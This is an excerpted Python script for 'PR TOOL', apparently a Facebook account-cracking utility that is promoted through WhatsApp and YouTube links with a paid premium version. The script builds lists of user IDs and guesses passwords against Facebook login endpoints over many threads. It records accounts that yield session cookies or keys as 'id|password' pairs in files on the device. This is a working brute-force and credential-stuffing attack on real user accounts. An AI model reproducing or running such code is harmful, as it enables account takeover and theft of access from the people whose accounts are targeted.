...
os.system('xdg-open https://www.facebook.com/profile.php?id=100086204871929/')
...
----------------------------------------------
 Author    : SAMREEN X PARWEZ
 Github    : SAMREEN X PARWEZ
 Tool Name : PR TOOL
 Type type : Free
 Version   : 0.2
\033[1;37m----------------------------------------------""")
        ...
        #       chk()
                ...
                if x == ("sex"):
                        ...
                        if xd in ['1','01']:
                                ...
                                linex()
                                for i in range(ps_limit):
                                        plist.append(input(f' Put password {i+2}: '))
                                linex()
                                ...
                                os.system(f'xdg-open https://chat.whatsapp.com/DDDYwrGI4Gk0GyrGlXKCfi/{wx}');menu()
                        elif xd in ['7','07']:
                                os.system('xdg-open https://www.facebook.com/profile.php?id=100086204871929');menu()
                        elif xd in ['8','08']:
                                os.system('xdg-open https://www.facebook.com/profile.php?id=100086204871929/?app=fbl');menu()
                        elif xd in ['0','00']:
                                exit(' Thanks for use 🥰 ')
                        else:
                        ...
                        linex()
                        url_wa = "https://youtube.com/@PARWEZhamzayt6210="
                        name = input(" Enter your Name : ")
                        linex()
                        tks = ("Hi PARWEZ Sir, I Need To Buy Your Paid PARWEZ PRO Tools Version 1.9.0 Premium Please Accept My Key To Premium :)\n\n Name :- "+name+"\n Key :- "+fkeyx)
                        subprocess.check_output(["am", "start", url_wa+(tks)]);time.sleep(2)
                        print(' Run :  python PARWEZ.py')
                        exit()
        except ValueError:
                exit()
        except requests.exceptions.ConnectionError:
...
def pak():
                ...
                for nmbr in range(limit):
                        ...
                        user.append(nmp)
                with tred(max_workers=30) as PARWEZ:     
                        clear()
                        tl = str(len(user))
                        ...
                        for psx in user:
                                ...
                                PARWEZ.submit(rndm,ids,passlist)
                print('\033[1;37m')
                linex()
                print(' The process has completed')
                print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
...
def ffb(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;37m [PARWEZ-XD] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        PARWEZ=session.cookies.get_dict().keys()
                        if "c_user" in PARWEZ:
                                coki=session.cookies.get_dict()
                                kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                                print('\r\r\033[1;32m [PARWEZ-OK] %s | %s'%(ids,pas))
                                open('/sdcard/PARWEZ-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in PARWEZ:
                                if 'y' in pcp:
                                        print('\r\r\x1b[38;5;208m [PARWEZ-CP] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/PARWEZ-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
                ...
                try:
                        ...
                        for pw in passlist:
                                ...
                                head = {
                                          ...
                                          # 'cookie': 'datr=iPL2Y7kt4HNnSQ3F_Ctw_8pq; sb=iPL2Y0fnNhZiIBUYSuFo7QFz; m_pixel_ratio=1.75; wd=412x757; fr=0YHWmW36DGQVzIzHc..Bj9vKI.CS.AAA.0.0.Bj9vKf.AWWdu4nCF0A',
                                ...
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print('\r\r\033[1;32m [PARWEZ-OK] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/PARWEZ-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                ...
                try:
                        ...
                        for pas in passlist:
                                ...
                                if 'session_key' in q:
                                        uid=str(q['uid'])
                                        try:
                                                okk=open('/sdcard/PARWEZ-OK.txt','r').read()
                                                if uid in okk:pass
                                                else:
                                                        print('\r\r\033[1;32m [PARWEZ-OK] '+uid+' | '+pas+'\033[1;97m')
                                                        open('/sdcard/PARWEZ-OK.txt','a').write(uid+'|'+pas+'\n')
                                                        oks.append(ids)
                                                        break
                                        except:
                                                print('\r\r\033[1;32m [PARWEZ-OK] '+uid+' | '+pas+'\033[1;97m')
